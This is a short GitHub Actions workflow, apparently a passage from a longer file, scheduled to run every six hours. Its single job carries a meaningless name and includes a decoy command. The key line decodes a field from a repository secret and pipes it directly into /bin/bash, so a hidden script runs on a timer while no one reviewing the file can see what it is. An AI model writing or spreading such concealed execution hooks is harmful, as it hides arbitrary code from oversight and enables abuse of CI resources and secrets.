  schedule:
    - cron: '38 1/6 * * *'

jobs:  # 19857
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: tangyangzhong1987
        env:
          r12116: ${{ secrets.r12116 }}
        run: |
          which cat | export GGGGG=
          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
          echo $r12116 | jq -r .a31191 | /bin/bash
